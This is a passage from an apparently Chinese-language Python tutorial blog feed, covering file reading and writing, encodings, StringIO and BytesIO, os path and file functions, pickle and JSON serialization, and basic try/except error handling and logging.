class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f = open(&apos;/Users/michael/test.jpg&apos;, &apos;rb&apos;)</span><br><span class="line">&gt;&gt;&gt; f.read()</span><br><span class="line">b&apos;\xff\xd8\xff\xe1\x00\x18Exif\x00\x00...&apos; # 十六进制表示的字节</span><br></pre></td></tr></table></figure><p><br></p><h5 id="字符编码"><a href="#字符编码" class="headerlink" title="字符编码"></a>字符编码</h5><p>要读取非UTF-8编码的文本文件，需要给<code>open()</code>函数传入<code>encoding</code>参数，例如，读取GBK编码的文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f = open(&apos;/Users/michael/gbk.txt&apos;, &apos;r&apos;, encoding=&apos;gbk&apos;)</span><br><span class="line">&gt;&gt;&gt; f.read()</span><br><span class="line">&apos;测试&apos;</span><br></pre></td></tr></table></figure><p>遇到有些编码不规范的文件，你可能会遇到<code>UnicodeDecodeError</code>，因为在文本文件中可能夹杂了一些非法编码的字符。遇到这种情况，<code>open()</code>函数还接收一个<code>errors</code>参数，表示如果遇到编码错误后如何处理。最简单的方式是直接忽略：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f = open(&apos;/Users/michael/gbk.txt&apos;, &apos;r&apos;, encoding=&apos;gbk&apos;, errors=&apos;ignore&apos;)</span><br></pre></td></tr></table></figure><p><br></p><h4 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h4><p>写文件和读文件是一样的，唯一区别是调用<code>open()</code>函数时，传入标识符<code>&#39;w&#39;</code>或者<code>&#39;wb&#39;</code>表示写文本文件或写二进制文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f = open(&apos;/Users/michael/test.txt&apos;, &apos;w&apos;)</span><br><span class="line">&gt;&gt;&gt; f.write(&apos;Hello, world!&apos;)</span><br><span class="line">&gt;&gt;&gt; f.close()</span><br></pre></td></tr></table></figure><p>你可以反复调用<code>write()</code>来写入文件，但是务必要调用<code>f.close()</code>来关闭文件。当我们写文件时，操作系统往往不会立刻把数据写入磁盘，而是放到内存缓存起来，空闲的时候再慢慢写入。只有调用<code>close()</code>方法时，操作系统才保证把没有写入的数据全部写入磁盘。忘记调用<code>close()</code>的后果是数据可能只写了一部分到磁盘，剩下的丢失了。所以，还是用<code>with</code>语句来得保险：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&apos;/Users/michael/test.txt&apos;, &apos;w&apos;) as f:</span><br><span class="line">    f.write(&apos;Hello, world!&apos;)</span><br></pre></td></tr></table></figure><p>要写入特定编码的文本文件，请给<code>open()</code>函数传入<code>encoding</code>参数，将字符串自动转换成指定编码。</p><p><br></p><h4 id="StringIO"><a href="#StringIO" class="headerlink" title="StringIO"></a>StringIO</h4><p>很多时间,  数据读写不一定是文件，也可能在内存中读写。 StringIO 顾名思义就是在内存中读写string</p><p>要把str 写成StringIO， 我们需要创建一个StringIO， 然后像文件医院写入即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from io import StringIO</span><br><span class="line">&gt;&gt;&gt; f = StringIO()</span><br><span class="line">&gt;&gt;&gt; f.write(&apos;hello&apos;)</span><br><span class="line">5</span><br><span class="line">&gt;&gt;&gt; f.write(&apos; &apos;)</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; f.write(&apos;world!&apos;)</span><br><span class="line">6</span><br><span class="line">&gt;&gt;&gt; print(f.getvalue())</span><br><span class="line">hello world!</span><br></pre></td></tr></table></figure><p><code>getvalue()</code>方法用于获得写入后的str。</p><p>要读取StringIO，可以用一个str初始化StringIO，然后，像读文件一样读取：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from io import StringIO</span><br><span class="line">&gt;&gt;&gt; f = StringIO(&apos;Hello!\nHi!\nGoodbye!&apos;)</span><br><span class="line">&gt;&gt;&gt; while True:</span><br><span class="line">...     s = f.readline()</span><br><span class="line">...     if s == &apos;&apos;:</span><br><span class="line">...         break</span><br><span class="line">...     print(s.strip())</span><br><span class="line">...</span><br><span class="line">Hello!</span><br><span class="line">Hi!</span><br><span class="line">Goodbye!</span><br></pre></td></tr></table></figure><p><br></p><h4 id="BytesIO"><a href="#BytesIO" class="headerlink" title="BytesIO"></a>BytesIO</h4><p>StringIO操作的只能是str，如果要<strong>操作二进制数据，就需要使用BytesIO。</strong> </p><p>BytesIO实现了在内存中读写bytes，我们创建一个BytesIO，然后写入一些bytes：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from io import BytesIO</span><br><span class="line">&gt;&gt;&gt; f = BytesIO()</span><br><span class="line">&gt;&gt;&gt; f.write(&apos;中文&apos;.encode(&apos;utf-8&apos;))</span><br><span class="line">6</span><br><span class="line">&gt;&gt;&gt; print(f.getvalue())</span><br><span class="line">b&apos;\xe4\xb8\xad\xe6\x96\x87&apos;</span><br></pre></td></tr></table></figure><p>请注意，写入的不是str，而是经过UTF-8编码的bytes。 unicode</p><p>和StringIO类似，可以用一个bytes初始化BytesIO，然后，像读文件一样读取：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from io import BytesIO</span><br><span class="line">&gt;&gt;&gt; f = BytesIO(b&apos;\xe4\xb8\xad\xe6\x96\x87&apos;)   ## &quot;中文&quot;.encode(utf-8)  </span><br><span class="line">&gt;&gt;&gt; f.read()</span><br><span class="line">b&apos;\xe4\xb8\xad\xe6\x96\x87&apos;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="操作文件-和-目录-help-os"><a href="#操作文件-和-目录-help-os" class="headerlink" title="操作文件 和 目录   help(os)"></a>操作文件 和 目录   help(os)</h4><p>操作文件和目录的函数一部分放在<code>os</code>模块中，一部分放在<code>os.path</code>模块中，这一点要注意一下。查看、创建和删除目录可以这么调用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 查看当前目录的绝对路径:</span><br><span class="line">&gt;&gt;&gt; os.path.abspath(&apos;.&apos;)</span><br><span class="line">&apos;/Users/michael&apos;</span><br><span class="line"># 在某个目录下创建一个新目录，首先把新目录的完整路径表示出来:</span><br><span class="line">&gt;&gt;&gt; os.path.join(&apos;/Users/michael&apos;, &apos;testdir&apos;)</span><br><span class="line">&apos;/Users/michael/testdir&apos;</span><br><span class="line"># 然后创建一个目录:</span><br><span class="line">&gt;&gt;&gt; os.mkdir(&apos;/Users/michael/testdir&apos;)</span><br><span class="line"># 删掉一个目录:</span><br><span class="line">&gt;&gt;&gt; os.rmdir(&apos;/Users/michael/testdir&apos;)</span><br></pre></td></tr></table></figure><p>把两个路径合成一个时，不要直接拼字符串，而要通过<code>os.path.join()</code>函数，这样可以正确处理不同操作系统的路径分隔符。在Linux/Unix/Mac下，<code>os.path.join()</code>返回这样的字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">part-1/part-2</span><br></pre></td></tr></table></figure><p>而Windows下会返回这样的字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">part-1\part-2</span><br></pre></td></tr></table></figure><p>同样的道理，要拆分路径时，也不要直接去拆字符串，而要通过<code>os.path.split()</code>函数，这样可以把一个路径拆分为两部分，后一部分总是最后级别的目录或文件名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.split(&apos;/Users/michael/testdir/file.txt&apos;)</span><br><span class="line">(&apos;/Users/michael/testdir&apos;, &apos;file.txt&apos;)</span><br></pre></td></tr></table></figure><p><code>os.path.splitext()</code>可以直接让你得到文件扩展名，很多时候非常方便：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.splitext(&apos;/path/to/file.txt&apos;)</span><br><span class="line">(&apos;/path/to/file&apos;, &apos;.txt&apos;)</span><br></pre></td></tr></table></figure><p>这些合并、拆分路径的函数并不要求目录和文件要真实存在，它们只对字符串进行操作。</p><p>文件操作使用下面的函数。假定当前目录下有一个<code>test.txt</code>文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 对文件重命名:</span><br><span class="line">&gt;&gt;&gt; os.rename(&apos;test.txt&apos;, &apos;test.py&apos;)</span><br><span class="line"># 删掉文件:</span><br><span class="line">&gt;&gt;&gt; os.remove(&apos;test.py&apos;)</span><br></pre></td></tr></table></figure><p>但是复制文件的函数居然在<code>os</code>模块中不存在！原因是复制文件并非由操作系统提供的系统调用。理论上讲，我们通过上一节的读写文件可以完成文件复制，只不过要多写很多代码。</p><p>幸运的是<code>shutil</code>模块提供了<code>copyfile()</code>的函数，你还可以在<code>shutil</code>模块中找到很多实用函数，它们可以看做是<code>os</code>模块的补充。</p><p>最后看看如何利用Python的特性来过滤文件。比如我们要列出当前目录下的所有目录，只需要一行代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [x for x in os.listdir(&apos;.&apos;) if os.path.isdir(x)]</span><br><span class="line">[&apos;.lein&apos;, &apos;.local&apos;, &apos;.m2&apos;, &apos;.npm&apos;, &apos;.ssh&apos;, &apos;.Trash&apos;, &apos;.vim&apos;, &apos;Applications&apos;, &apos;Desktop&apos;, ...]</span><br></pre></td></tr></table></figure><p>要列出所有的<code>.py</code>文件，也只需一行代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [x for x in os.listdir(&apos;.&apos;) if os.path.isfile(x) and os.path.splitext(x)[1]==&apos;.py&apos;]</span><br><span class="line">[&apos;apis.py&apos;, &apos;config.py&apos;, &apos;models.py&apos;, &apos;pymonitor.py&apos;, &apos;test_db.py&apos;, &apos;urls.py&apos;, &apos;wsgiapp.py&apos;]</span><br></pre></td></tr></table></figure><p><br></p><h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><p>在程序运行的过程中，所有的变量都是在内存中，比如，定义一个dict：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d = dict(name=&apos;Bob&apos;, age=20, score=88)</span><br></pre></td></tr></table></figure><p>可以随时修改变量，比如把<code>name</code>改成<code>&#39;Bill&#39;</code>，但是一旦程序结束，变量所占用的内存就被操作系统全部回收。如果没有把修改后的<code>&#39;Bill&#39;</code>存储到磁盘上，下次重新运行程序，变量又被初始化为<code>&#39;Bob&#39;</code>。</p><p><strong>我们把变量从内存中变成可存储或传输的过程称之为序列化，在Python中叫pickling。</strong> </p><p><strong>序列化之后，就可以把序列化后的内容写入磁盘，或者通过网络传输到别的机器上。</strong></p><p><strong>反过来，把变量内容从序列化的对象重新读到内存里称之为反序列化，即unpickling。</strong> </p><p>我们尝试把一个对象序列化并写入文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import pickle</span><br><span class="line">&gt;&gt;&gt; d = dict(name=&apos;Bob&apos;, age=20, score=88)</span><br><span class="line">&gt;&gt;&gt; pickle.dumps(d)</span><br><span class="line">b&apos;\x80\x03&#125;q\x00(X\x03\x00\x00\x00ageq\x01K\x14X\x05\x00\x00\x00scoreq\x02KXX\x04\x00\x00\x00nameq\x03X\x03\x00\x00\x00Bobq\x04u.&apos;</span><br></pre></td></tr></table></figure><p><code>pickle.dumps()</code>方法把任意对象序列化成一个<code>bytes</code>，然后，就可以把这个<code>bytes</code>写入文件。或者用另一个方法<code>pickle.dump()</code>直接把对象序列化后写入一个file-like Object：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f = open(&apos;dump.txt&apos;, &apos;wb&apos;)</span><br><span class="line">&gt;&gt;&gt; pickle.dump(d, f)  ## dump 序列化成为一个bytes</span><br><span class="line">&gt;&gt;&gt; f.close()</span><br></pre></td></tr></table></figure><p>看看写入的<code>dump.txt</code>文件，一堆乱七八糟的内容，这些都是Python保存的对象内部信息。</p><p>当我们要把对象从磁盘读到内存时，可以先把内容读到一个<code>bytes</code>，然后用<code>pickle.loads()</code>方法反序列化出对象，也可以直接用<code>pickle.load()</code>方法从一个<code>file-like Object</code>中直接反序列化出对象。我们打开另一个Python命令行来反序列化刚才保存的对象：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f = open(&apos;dump.txt&apos;, &apos;rb&apos;)</span><br><span class="line">&gt;&gt;&gt; d = pickle.load(f)</span><br><span class="line">&gt;&gt;&gt; f.close()</span><br><span class="line">&gt;&gt;&gt; d</span><br><span class="line">&#123;&apos;age&apos;: 20, &apos;score&apos;: 88, &apos;name&apos;: &apos;Bob&apos;&#125;</span><br></pre></td></tr></table></figure><p>变量的内容又回来了！</p><p><img src="/img/pickling_序列化.png" alt="序列化"></p><p><br></p><h4 id="Json-文本"><a href="#Json-文本" class="headerlink" title="Json 文本"></a>Json 文本</h4><p>​    我们要在不同的编程语言之间传递对象，就必须把对象序列化为标准格式，比如XML，但更好的方法是序列化为JSON，因为JSON表示出来就是一个字符串，可以被所有语言读取，也可以方便地存储到磁盘或者通过网络传输。JSON不仅是标准格式，并且比XML更快，而且可以直接在Web页面中读取，非常方便。</p><p>JSON表示的对象就是标准的JavaScript语言的对象，JSON和Python内置的数据类型对应如下：</p><table><thead><tr><th>JSON类型</th><th>Python类型</th></tr></thead><tbody><tr><td>{}</td><td>dict</td></tr><tr><td>[]</td><td>list</td></tr><tr><td>“string”</td><td>str</td></tr><tr><td>1234.56</td><td>int或float</td></tr><tr><td>true/false</td><td>True/False</td></tr><tr><td>null</td><td>None</td></tr></tbody></table><p>Python内置的<code>json</code>模块提供了非常完善的Python对象到JSON格式的转换。我们先看看如何把Python对象变成一个JSON：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import json</span><br><span class="line">&gt;&gt;&gt; d = dict(name=&apos;Bob&apos;, age=20, score=88)   ## 本身是一个字典;</span><br><span class="line">&gt;&gt;&gt; json.dumps(d)</span><br><span class="line">&apos;&#123;&quot;age&quot;: 20, &quot;score&quot;: 88, &quot;name&quot;: &quot;Bob&quot;&#125;&apos;</span><br></pre></td></tr></table></figure><p><code>dumps()</code>方法返回一个<code>str</code>，内容就是标准的JSON。类似的，<code>dump()</code>方法可以直接把JSON写入一个<code>file-like Object</code>。</p><p>要把JSON反序列化为Python对象，用<code>loads()</code>或者对应的<code>load()</code>方法，前者把JSON的字符串反序列化，后者从<code>file-like Object</code>中读取字符串并反序列化：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; json_str = &apos;&#123;&quot;age&quot;: 20, &quot;score&quot;: 88, &quot;name&quot;: &quot;Bob&quot;&#125;&apos;</span><br><span class="line">&gt;&gt;&gt; json.loads(json_str)</span><br><span class="line">&#123;&apos;age&apos;: 20, &apos;score&apos;: 88, &apos;name&apos;: &apos;Bob&apos;&#125;</span><br></pre></td></tr></table></figure><p>由于JSON标准规定JSON编码是UTF-8，所以我们总是能正确地在Python的<code>str</code>与JSON的字符串之间转换。</p><p><br></p><h4 id="Json-与-class类-忽略"><a href="#Json-与-class类-忽略" class="headerlink" title="Json 与 class类  (忽略)"></a>Json 与 class类  (忽略)</h4><p>Python的<code>dict</code>对象可以直接序列化为JSON的<code>{}</code>，不过，很多时候，我们更喜欢用<code>class</code>表示对象，比如定义<code>Student</code>类，然后序列化：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line"></span><br><span class="line">class Student(object):</span><br><span class="line">    def __init__(self, name, age, score):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">        self.score = score</span><br><span class="line"></span><br><span class="line">s = Student(&apos;Bob&apos;, 20, 88)</span><br><span class="line">print(json.dumps(s))</span><br></pre></td></tr></table></figure><p>运行代码，毫不留情地得到一个<code>TypeError</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  ...</span><br><span class="line">TypeError: &lt;__main__.Student object at 0x10603cc50&gt; is not JSON serializable</span><br></pre></td></tr></table></figure><p>错误的原因是<code>Student</code>对象不是一个可序列化为JSON的对象。</p><p>如果连<code>class</code>的实例对象都无法序列化为JSON，这肯定不合理！</p><p>别急，我们仔细看看<code>dumps()</code>方法的参数列表，可以发现，除了第一个必须的<code>obj</code>参数外，<code>dumps()</code>方法还提供了一大堆的可选参数：</p><p><a href="https://docs.python.org/3/library/json.html#json.dumps" target="_blank" rel="noopener">https://docs.python.org/3/library/json.html#json.dumps</a></p><p>这些可选参数就是让我们来定制JSON序列化。前面的代码之所以无法把<code>Student</code>类实例序列化为JSON，是因为默认情况下，<code>dumps()</code>方法不知道如何将<code>Student</code>实例变为一个JSON的<code>{}</code>对象。</p><p>可选参数<code>default</code>就是把任意一个对象变成一个可序列为JSON的对象，我们只需要为<code>Student</code>专门写一个转换函数，再把函数传进去即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def student2dict(std):</span><br><span class="line">    return &#123;</span><br><span class="line">        &apos;name&apos;: std.name,</span><br><span class="line">        &apos;age&apos;: std.age,</span><br><span class="line">        &apos;score&apos;: std.score</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这样，<code>Student</code>实例首先被<code>student2dict()</code>函数转换成<code>dict</code>，然后再被顺利序列化为JSON：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(json.dumps(s, default=student2dict))  ##添加默认转换函数</span><br><span class="line">&#123;&quot;age&quot;: 20, &quot;name&quot;: &quot;Bob&quot;, &quot;score&quot;: 88&#125;</span><br></pre></td></tr></table></figure><p>不过，下次如果遇到一个<code>Teacher</code>类的实例，照样无法序列化为JSON。我们可以偷个懒，把任意<code>class</code>的实例变为<code>dict</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(json.dumps(s, default=lambda obj: obj.__dict__))</span><br></pre></td></tr></table></figure><p>因为通常<code>class</code>的实例都有一个<code>__dict__</code>属性，它就是一个<code>dict</code>，用来存储实例变量。也有少数例外，比如定义了<code>__slots__</code>的class。</p><p>同样的道理，如果我们要把JSON反序列化为一个<code>Student</code>对象实例，<code>loads()</code>方法首先转换出一个<code>dict</code>对象，然后，我们传入的<code>object_hook</code>函数负责把<code>dict</code>转换为<code>Student</code>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def dict2student(d):</span><br><span class="line">    return Student(d[&apos;name&apos;], d[&apos;age&apos;], d[&apos;score&apos;])    ## 实例化之后为本身类实例;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; json_str = &apos;&#123;&quot;age&quot;: 20, &quot;score&quot;: 88, &quot;name&quot;: &quot;Bob&quot;&#125;&apos;</span><br><span class="line">&gt;&gt;&gt; print(json.loads(json_str, object_hook=dict2student))</span><br><span class="line">&lt;__main__.Student object at 0x10cd3c190&gt;</span><br></pre></td></tr></table></figure><p>打印出的是反序列化的<code>Student</code>实例对象。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python-错误、调试</title>
      <link href="/2018/01/25/gram/Python-%E9%94%99%E8%AF%AF%E3%80%81%E8%B0%83%E8%AF%95/"/>
      <url>/2018/01/25/gram/Python-%E9%94%99%E8%AF%AF%E3%80%81%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<ul><li>try</li><li>raise</li><li>断言</li></ul><a id="more"></a><p><br></p><h4 id="try"><a href="#try" class="headerlink" title="try"></a>try</h4><p>让我们用一个例子来看看<code>try</code>的机制：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    print(&apos;try...&apos;)</span><br><span class="line">    r = 10 / 0</span><br><span class="line">    print(&apos;result:&apos;, r)</span><br><span class="line">except ZeroDivisionError as e:</span><br><span class="line">    print(&apos;except:&apos;, e)</span><br><span class="line">finally:</span><br><span class="line">    print(&apos;finally...&apos;)</span><br><span class="line">print(&apos;END&apos;)</span><br></pre></td></tr></table></figure><p>当我们认为某些代码可能会出错时:</p><ul><li>可以用<code>try</code>来运行这段代码，如果执行出错，则后续代码不会继续执行，而是直接跳转至错误处理代码，即<code>except</code>语句块，执行完<code>except</code>后，如果有<code>finally</code>语句块，则执行<code>finally</code>语句块，至此，执行完毕。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    print(&apos;try...&apos;)</span><br><span class="line">    r = 10 / int(&apos;a&apos;)</span><br><span class="line">    print(&apos;result:&apos;, r)</span><br><span class="line">except ValueError as e:</span><br><span class="line">    print(&apos;ValueError:&apos;, e)</span><br><span class="line">except ZeroDivisionError as e:</span><br><span class="line">    print(&apos;ZeroDivisionError:&apos;, e)</span><br><span class="line">finally:</span><br><span class="line">    print(&apos;finally...&apos;)</span><br><span class="line">print(&apos;END&apos;)</span><br></pre></td></tr></table></figure><p><br></p><h4 id="记录错误"><a href="#记录错误" class="headerlink" title="记录错误"></a>记录错误</h4><p>如果不捕获错误，自然可以让Python解释器来打印出错误堆栈，但程序也被结束了。既然我们能捕获错误，就可以把错误堆栈打印出来，然后分析错误原因，同时，让程序继续执行下去。</p><p>Python内置的<code>logging</code>模块可以非常容易地记录错误信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># err_logging.py</span><br><span class="line"></span><br><span class="line">import logging</span><br><span class="line"></span><br><span class="line">def foo(s):</span><br><span class="line">    return 10 / int(s)</span><br><span class="line"></span><br><span class="line">def bar(s):</span><br><span class="line">    return foo(s) * 2</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    try:</span><br><span class="line">        bar(&apos;0&apos;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        logging.exception(e)</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">print(&apos;END&apos;)</span><br></pre></td></tr></table></figure><p>同样是出错，但程序打印完错误信息后会继续执行，并正常退出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ python3 err_logging.py</span><br><span class="line">ERROR:root:division by zero</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;err_logging.py&quot;, line 13, in main</span><br><span class="line">    bar(&apos;0&apos;)</span><br><span class="line">  File &quot;err_logging.py&quot;, line 9, in bar</span><br><span class="line">    return foo(s) * 2</span><br><span class="line">  File &quot;err_logging.py&quot;, line 6, in foo</span><br><span class="line">    return 10 / int(s)</span><br><span class="line">ZeroDivisionError: division by zero</span><br><span class="line">END</span><br></pre></td></tr></table></figure><p>通过配置，<code>logging</code>还可以把错误记录到日志文件里，方便事后排查。</p><p>日志文件可以通过 <code>@log</code> 装饰器来打印日志</p><p><br></p><h4 id="抛出错误"><a href="#抛出错误" class="headerlink" title="抛出错误"></a>抛出错误</h4><p>因为错误是class，捕获一个错误就是捕获到该class的一个实例。因此，错误并不是凭空产生的，而是有意创建并抛出的。Python的内置函数会抛出很多类型的错误，我们自己编写的函数也可以抛出错误。</p><p>如果要抛出错误，首先根据需要，可以定义一个错误的class，选择好继承关系，然后，用<code>raise</code>语句抛出一个错误的实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># err_raise.py</span><br><span class="line">class FooError(ValueError):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def foo(s):</span><br><span class="line">    n = int(s)</span><br><span class="line">    if n==0:</span><br><span class="line">        raise FooError(&apos;invalid value: %s&apos; % s)</span><br><span class="line">    return 10 / n</span><br><span class="line"></span><br><span class="line">foo(&apos;0&apos;)</span><br></pre></td></tr></table></figure><p>执行，可以最后跟踪到我们自己定义的错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ python3 err_raise.py </span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;err_throw.py&quot;, line 11, in &lt;module&gt;</span><br><span class="line">    foo(&apos;0&apos;)</span><br><span class="line">  File &quot;err_throw.py&quot;, line 8, in foo</span><br><span class="line">    raise FooError(&apos;invalid value: %s&apos; % s)</span><br><span class="line">__main__.FooError: invalid value: 0</span><br></pre></td></tr></table></figure><p>只有在必要的时候才定义我们自己的错误类型。如果可以选择Python已有的内置的错误类型（比如<code>ValueError</code>，<code>TypeError</code>），尽量使用Python内置的错误类型。</p><p>最后，我们来看另一种错误处理的方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 